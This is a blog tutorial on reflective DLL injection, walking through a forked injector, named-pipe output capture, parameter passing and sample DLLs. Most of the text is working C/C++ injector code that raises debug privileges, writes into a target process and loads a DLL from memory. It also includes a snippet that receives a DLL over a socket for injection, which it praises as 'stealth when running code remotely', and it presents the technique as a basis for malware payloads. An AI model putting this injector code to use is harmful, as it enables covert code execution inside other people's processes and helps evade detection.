### Beginners guide to Reflective DLL Injection
https://quantumcored.com/index.php/2021/03/26/beginners-guide-to-reflective-dll-injection/

DLL injection is a technique used for running code within the address space of another process by forcing it to load a dynamic-link library. DLL injection is often used by external programs to influence the behavior of another program in a way its authors did not anticipate or intend.

While Standard DLL Injection is Cool, It has it’s pros and cons. One major being that it’s required for the Dll to be stored on disk.

That’s when our Malware Jesus, Stephen Fewer developed Reflective DLL Injection. In Reflective DLL Injection, The DLL can be loaded entirely from memory without ever touching the disk. In this Post I am going to show you how to

Create a Reflective DLL Injector, Create a Reflective DLL, How to pass Parameters to the Reflective DLL and how to get it’s Output.

Giving you the power to run anything in memory.


Let’s start. First of all, I must link the Original Reflective DLL Injection Repository. But we are going to be using my Fork of Reflective DLL Injection, Which is modified to get output from the DLL using named Pipes.

https://github.com/quantumcored/ReflectiveDLLInjection

You can play around with this code and compile it with whatever you want. But for simplicity, I’m going to use the Visual Studio project itself that’s attached.

All the code in this Post is from the repositories above.

### Understanding the Changes
https://github.com/quantumcored/ReflectiveDLLInjection/blob/master/dll/src/Output.cpp
```
#include "Output.h"

void Send(const char* data)
{
    HANDLE hPipe;
    DWORD dwWritten;


    hPipe = CreateFile(TEXT("\\\\.\\pipe\\quantumcore"),
        GENERIC_READ | GENERIC_WRITE,
        0,
        NULL,
        OPEN_EXISTING,
        0,
        NULL);
    if (hPipe != INVALID_HANDLE_VALUE)
    {
        if (WriteFile(hPipe,
            data,
            strlen(data),
            &dwWritten,
            NULL)) {
            CloseHandle(hPipe);
        }
    }
}
```
The DLL function Send(const char* data); is used to send the Injecting program the output of the dll using named pipes, We’ll go over on how to do this in a moment.

On the Injecting Side

https://github.com/quantumcored/ReflectiveDLLInjection/blob/master/inject/src/Output.cpp
```
#include "Output.h"

BOOL Run = FALSE;
std::ostringstream OUTPUT;
HANDLE hThread;

DWORD WINAPI PIPETHREAD(LPVOID lpParameter) {
	HANDLE hPipe;
	char buffer[BUFFER];
	DWORD dwRead;


	hPipe = CreateNamedPipe(TEXT("\\\\.\\pipe\\quantumcore"),
		PIPE_ACCESS_DUPLEX,
		PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT,   
		1,
		1024 * 16,
		1024 * 16,
		NMPWAIT_USE_DEFAULT_WAIT,
		NULL);

	while (Run)
	{
		
		while (hPipe != INVALID_HANDLE_VALUE)
		{
			if (ConnectNamedPipe(hPipe, NULL) != FALSE) 
			{
				memset(buffer, '\0', BUFFER);
				while (ReadFile(hPipe, buffer, sizeof(buffer) , &dwRead, NULL) != FALSE)
				{
					buffer[dwRead] = '\0';

					OUTPUT << buffer;
				}
			}

			DisconnectNamedPipe(hPipe);
		}

		if (!Run)
		{
			break;
		}
	}

	return 0;
}

void Prepare()
{
	Run = TRUE;
	hThread = CreateThread(NULL, 0, PIPETHREAD, NULL, 0, NULL);
	if (hThread == NULL)
	{
		printf("Error Creating Thread: %ld\n", GetLastError());
	}
}

BOOL isPipeThreadRunning()
{
	DWORD exitCode;
	return GetExitCodeThread(hThread, &exitCode);
}

std::string ReadReflectiveDllOutput(int Timeout)
{
	int x = 0;
	if (Run)
	{
		do {
			Sleep(1000);
			x++;
		} while (x != Timeout);

		Run = FALSE; // The thread ends.

	}
	return OUTPUT.str();
}
```
Before Injection of the DLL, The Prepare(); function is called which starts the Named Pipe Thread to receive the DLL Output. You can see example usage of this here :

https://github.com/quantumcored/ReflectiveDLLInjection/blob/master/inject/src/Inject.cpp
```
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include "Output.h"
#include "LoadLibraryR.h"
#include <iostream>

#pragma comment(lib,"Advapi32.lib")

#define BREAK_WITH_ERROR( e ) { printf( "[-] %s. Error=%d", e, GetLastError() ); break; }

// Simple app to inject a reflective DLL into a process vis its process ID.
int main( int argc, char * argv[] )
{
	HANDLE hFile          = NULL;
	HANDLE hModule        = NULL;
	HANDLE hProcess       = NULL;
	HANDLE hToken         = NULL;
	LPVOID lpBuffer       = NULL;
	DWORD dwLength        = 0;
	DWORD dwBytesRead     = 0;
	DWORD dwProcessId     = 0;
	TOKEN_PRIVILEGES priv = {0};

#ifdef WIN_X64
	char * cpDllFile  = "reflective_dll.x64.dll";
#else
#ifdef WIN_X86
	char * cpDllFile  = "reflective_dll.dll";
#else WIN_ARM
	char * cpDllFile  = "reflective_dll.arm.dll";
#endif
#endif

	do
	{
		// Usage: inject.exe [pid] [dll_file]
		BOOL readOutput;
		std::string input;
		int seconds;
		std::cout << "Would you like to read the DLL Output? (y/N) : ";
		std::cin >> input;
		if (input.rfind("y",0) == 0 || input.rfind("Y", 0) == 0) {
			std::cout << "Enter number of seconds to wait before Reading Input : ";
			std::cin >> seconds;
			readOutput = true;
			Prepare();
		}

		if( argc == 1 )
			dwProcessId = GetCurrentProcessId();
		else
			dwProcessId = atoi( argv[1] );

		if( argc >= 3 )
			cpDllFile = argv[2];

		hFile = CreateFileA( cpDllFile, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL );
		if( hFile == INVALID_HANDLE_VALUE )
			BREAK_WITH_ERROR( "Failed to open the DLL file" );

		dwLength = GetFileSize( hFile, NULL );
		if( dwLength == INVALID_FILE_SIZE || dwLength == 0 )
			BREAK_WITH_ERROR( "Failed to get the DLL file size" );

		lpBuffer = HeapAlloc( GetProcessHeap(), 0, dwLength );
		if( !lpBuffer )
			BREAK_WITH_ERROR( "Failed to get the DLL file size" );

		if( ReadFile( hFile, lpBuffer, dwLength, &dwBytesRead, NULL ) == FALSE )
			BREAK_WITH_ERROR( "Failed to alloc a buffer!" );

		if( OpenProcessToken( GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken ) )
		{
			priv.PrivilegeCount           = 1;
			priv.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
		
			if( LookupPrivilegeValue( NULL, SE_DEBUG_NAME, &priv.Privileges[0].Luid ) )
				AdjustTokenPrivileges( hToken, FALSE, &priv, 0, NULL, NULL );

			CloseHandle( hToken );
		}

		hProcess = OpenProcess( PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, FALSE, dwProcessId );
		if( !hProcess )
			BREAK_WITH_ERROR( "Failed to open the target process" );

		hModule = LoadRemoteLibraryR( hProcess, lpBuffer, dwLength, NULL );
		if( !hModule )
			BREAK_WITH_ERROR( "Failed to inject the DLL" );

		printf( "[+] Injected the '%s' DLL into process %d.", cpDllFile, dwProcessId );
		
		WaitForSingleObject( hModule, -1 );

		if (readOutput) {
			printf("\n[+] DLL Output : %s\n", ReadReflectiveDllOutput(seconds).c_str());
		}
		

	} while( 0 );


	if( lpBuffer )
		HeapFree( GetProcessHeap(), 0, lpBuffer );

	if( hProcess )
		CloseHandle( hProcess );


	
	
	

	return 0;
}
```
So basically, To receive Output from the Reflective DLL, We are creating a Named Pipe Server before injecting,

Then the Reflective DLL is injected and Writes the output to the Named Pipe Server.

### Passing Parameters to the DLL
This one didn’t require any modifications, The original Reflective DLL Injection allows you to pass parameters using LoadRemoteLibraryR function.

Example Code :
```
// Sample code of Injector that passes parameter to the dll
int main( int argc, char * argv[] )
{
	HANDLE hFile          = NULL;
	HANDLE hModule        = NULL;
	HANDLE hProcess       = NULL;
	HANDLE hToken         = NULL;
	LPVOID lpBuffer       = NULL;
	DWORD dwLength        = 0;
	DWORD dwBytesRead     = 0;
	DWORD dwProcessId     = 0;
	TOKEN_PRIVILEGES priv = {0};
        LPVOID lpRemoteCommandLine = NULL;
        char* cpCommandLine = "Hello, World!";
#ifdef _WIN64
	char * cpDllFile  = "reflective_dll.x64.dll";
#else
#ifdef WIN_X86
	char * cpDllFile  = "reflective_dll.dll";
#else WIN_ARM
	char * cpDllFile  = "reflective_dll.arm.dll";
#endif
#endif
	do {
              // Open or LOAD DLL ...
              unsigned char* DLL = ..;
                if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &amp;hToken))
                {
                    priv.PrivilegeCount = 1;
                    priv.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
                    if (LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &amp;priv.Privileges[0].Luid))
                        AdjustTokenPrivileges(hToken, FALSE, &amp;priv, 0, NULL, NULL);
                    CloseHandle(hToken);
                }
                hProcess = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, FALSE, dwProcessId);
                if (!hProcess)
                    BREAK_WITH_ERROR("Failed to open the target process");
                    lpRemoteCommandLine = VirtualAllocEx(hProcess, NULL, strlen(cpCommandLine) + 1, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
                    if (!lpRemoteCommandLine)
                        BREAK_WITH_ERROR("[INJECT] inject_dll. VirtualAllocEx 1 failed");
                    if (!WriteProcessMemory(hProcess, lpRemoteCommandLine, cpCommandLine, strlen(cpCommandLine) + 1, NULL))
                        BREAK_WITH_ERROR("[INJECT] inject_dll. WriteProcessMemory 1 failed");
                    hModule = LoadRemoteLibraryR(hProcess, DLL,sizeof(DLL), lpRemoteCommandLine);
                    if (!hModule)
                        BREAK_WITH_ERROR("Failed to inject the DLL");
                WaitForSingleObject(hModule, -1);
	} while( 0 );
	
	if (hFile
		CloseHandle(hFile);
	
	if( lpBuffer )
		HeapFree( GetProcessHeap(), 0, lpBuffer );
	if( hProcess )
		CloseHandle( hProcess );
	return 0;
}
```
The Example code above expects the dll to be in unsigned char* DLL and it passes cpCommandLine into it.

### Reading Parameters in the DLL
In your reflective dll, The parameters are in lpReserverd, From which a string an easily be extracted by.
```
char* cpCommandLine = (char*)lpReserved;
```

Sample Code :
```
#include "ReflectiveLoader.h"
#include "Output.h"
extern HINSTANCE hAppInstance;
BOOL WINAPI DllMain( HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved )
{
    BOOL bReturnValue = TRUE;
	switch( dwReason ) 
    { 
		case DLL_QUERY_HMODULE:
			if( lpReserved != NULL )
				*(HMODULE *)lpReserved = hAppInstance;
			break;
		case DLL_PROCESS_ATTACH:
			hAppInstance = hinstDLL;
                        char* cpCommandLine = (char*)lpReserved;
            MessageBoxA(NULL, cpCommandLine, "Hello, World!", MB_OK);
			
			break;
		case DLL_PROCESS_DETACH:
		case DLL_THREAD_ATTACH:
		case DLL_THREAD_DETACH:
            break;
    }
	return bReturnValue;
}
```
The above will show a message box showing the parameters that were passed from the injector.

### Making a Reflective DLL
A Simple Reflective DLL Example is here

https://github.com/quantumcored/ReflectiveDLLInjection/blob/master/dll/src/ReflectiveDll.cpp
```
#include "ReflectiveLoader.h"
#include "Output.h"
extern HINSTANCE hAppInstance;
BOOL WINAPI DllMain( HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved )
{
    BOOL bReturnValue = TRUE;
	switch( dwReason ) 
    { 
		case DLL_QUERY_HMODULE:
			if( lpReserved != NULL )
				*(HMODULE *)lpReserved = hAppInstance;
			break;
		case DLL_PROCESS_ATTACH:
			hAppInstance = hinstDLL;
            MessageBoxA(NULL, "Hello from Reflective DLL!", "Success", MB_OK);
			Send("Evening the Odds.");
			break;
		case DLL_PROCESS_DETACH:
		case DLL_THREAD_ATTACH:
		case DLL_THREAD_DETACH:
            break;
    }
	return bReturnValue;
}
```
I’m gonna be using this as base to build our sample DLL. This, Currently, Shows a message box and returns output “Evening the Odds”. I wrote this for testing Outputs.

Let’s make a DLL that Reads in a URL from Parameters and Opens it, Then return output.
```
#include "ReflectiveLoader.h"
#include "Output.h"
#include <shellapi.h>
#include<sstream>

extern HINSTANCE hAppInstance;

//===============================================================================================//
BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved)
{
	BOOL bReturnValue = TRUE;
	char* Url;
	std::ostringstream out;
	switch (dwReason)
	{
	case DLL_QUERY_HMODULE:
		if (lpReserved != NULL)
			*(HMODULE*)lpReserved = hAppInstance;
		break;
	case DLL_PROCESS_ATTACH:
		hAppInstance = hinstDLL;	
		
		Url=  (char*)lpReserved; // The url passed in parameter by our injector, make sure the url starts with http/https
		ShellExecute(0, 0, Url, 0, 0, SW_SHOW); // open the url
		out << "Opened URL : " << Url << std::endl;
		Send(out.str().c_str());
		break;
	case DLL_PROCESS_DETACH:
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
		break;
	}
	return bReturnValue;
}
```
The above dll is pretty simple, It reads in the url from parameters, Opens the url using ShellExecute and sends output to the injector that the url Url was opened.

But a Reflective DLL is nothing without the injector. So let’s make a complete injector for this.
```
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include "Output.h"
#include "LoadLibraryR.h"
#include <iostream>

#pragma comment(lib,"Advapi32.lib")

#define BREAK_WITH_ERROR( e ) { printf( "[-] %s. Error=%d", e, GetLastError() ); break; }

// Simple app to inject a reflective DLL into a process vis its process ID.
int main( int argc, char * argv[] )
{
	HANDLE hFile          = NULL;
	HANDLE hModule        = NULL;
	HANDLE hProcess       = NULL;
	HANDLE hToken         = NULL;
	LPVOID lpBuffer       = NULL;
	DWORD dwLength        = 0;
	DWORD dwBytesRead     = 0;
	DWORD dwProcessId     = 0;
	TOKEN_PRIVILEGES priv = {0};
	LPVOID lpRemoteCommandLine = NULL;
	char* cpCommandLine = "https://quantumcored.com";

#ifdef WIN_X64
	char * cpDllFile  = "reflective_dll.x64.dll";
#else
#ifdef WIN_X86
	char * cpDllFile  = "reflective_dll.dll";
#else WIN_ARM
	char * cpDllFile  = "reflective_dll.arm.dll";
#endif
#endif

	do
	{
		// Usage: inject.exe [pid] [dll_file]
		BOOL readOutput;
		std::string input;
		int seconds;
		std::cout << "Would you like to read the DLL Output? (y/N) : ";
		std::cin >> input;
		if (input.rfind("y",0) == 0 || input.rfind("Y", 0) == 0) {
			std::cout << "Enter number of seconds to wait before Reading Output : ";
			std::cin >> seconds;
			readOutput = true;
			Prepare();
		}

		if( argc == 1 )
			dwProcessId = GetCurrentProcessId();
		else
			dwProcessId = atoi( argv[1] );

		if( argc >= 3 )
			cpDllFile = argv[2];

		hFile = CreateFileA( cpDllFile, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL );
		if( hFile == INVALID_HANDLE_VALUE )
			BREAK_WITH_ERROR( "Failed to open the DLL file" );

		dwLength = GetFileSize( hFile, NULL );
		if( dwLength == INVALID_FILE_SIZE || dwLength == 0 )
			BREAK_WITH_ERROR( "Failed to get the DLL file size" );

		lpBuffer = HeapAlloc( GetProcessHeap(), 0, dwLength );
		if( !lpBuffer )
			BREAK_WITH_ERROR( "Failed to get the DLL file size" );

		if( ReadFile( hFile, lpBuffer, dwLength, &dwBytesRead, NULL ) == FALSE )
			BREAK_WITH_ERROR( "Failed to alloc a buffer!" );

		if( OpenProcessToken( GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken ) )
		{
			priv.PrivilegeCount           = 1;
			priv.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
		
			if( LookupPrivilegeValue( NULL, SE_DEBUG_NAME, &priv.Privileges[0].Luid ) )
				AdjustTokenPrivileges( hToken, FALSE, &priv, 0, NULL, NULL );

			CloseHandle( hToken );
		}

		hProcess = OpenProcess( PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, FALSE, dwProcessId );
		if( !hProcess )
			BREAK_WITH_ERROR( "Failed to open the target process" );

		lpRemoteCommandLine = VirtualAllocEx(hProcess, NULL, strlen(cpCommandLine) + 1, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
		if (!lpRemoteCommandLine)
			BREAK_WITH_ERROR("&#91;INJECT] inject_dll. VirtualAllocEx 1 failed");

		if (!WriteProcessMemory(hProcess, lpRemoteCommandLine, cpCommandLine, strlen(cpCommandLine) + 1, NULL))
			BREAK_WITH_ERROR("&#91;INJECT] inject_dll. WriteProcessMemory 1 failed"); // write parameters

		hModule = LoadRemoteLibraryR(hProcess, lpBuffer, dwLength, lpRemoteCommandLine); // Load the dll
		if (!hModule)
			BREAK_WITH_ERROR("Failed to inject the DLL");

		printf( "[+] Injected the '%s' DLL into process %d.", cpDllFile, dwProcessId );
		
		WaitForSingleObject( hModule, -1 );

		if (readOutput) {
			printf("\n[+] DLL Output : %s\n", ReadReflectiveDllOutput(seconds).c_str());
		}
		

	} while( 0 );


	if( lpBuffer )
		HeapFree( GetProcessHeap(), 0, lpBuffer );

	if( hProcess )
		CloseHandle( hProcess );


	
	
	

	return 0;
}
```

### Loading the DLL over socket
The DLL can also be loaded over a network using Sockets, And injected.

Sample code :

https://github.com/quantumcored/remote_hacker_probe/blob/main/probe/windows/ProbeCpp.cpp#L257
```
unsigned char* DLL = (unsigned char*) HeapAlloc(GetProcessHeap(), 0, expected + 1); // This is where DLL will be stored
// Where 'expected' is the Size of the dll.

            memset(recvbuf, '\0', BUFFER);
            ZeroMemory(DLL, expected + 1);
            int total = 0;

            do {
                fsize = recv(sockfd, recvbuf, BUFFER, 0);
                if (fsize == SOCKET_ERROR && WSAGetLastError() == WSAECONNRESET)
                {
                    connected = FALSE;
                    // printf("[X] Connection interrupted while receiving DLL\n");
                }
                else if (fsize == 0) {
                    break;
                }
                else {
                    memcpy(DLL + total, recvbuf, fsize);
                    total += fsize;
                }
            } while (total != expected);
// Continue Injecting the DLL.
```
Giving stealth when running code remotely.

### Reflective DLL Malware Payloads
Having the ability to run your own code in Memory is a great. You can write your own Reflective DLLS and run them.

That’s how metasploits meterpreter works. It relies heavily on Reflective DLL Injection. Many advanced frameworks use Reflective DLL Injection, Including Cobalt Strike, Metasploit and many APT’s.


Thanks for reading!
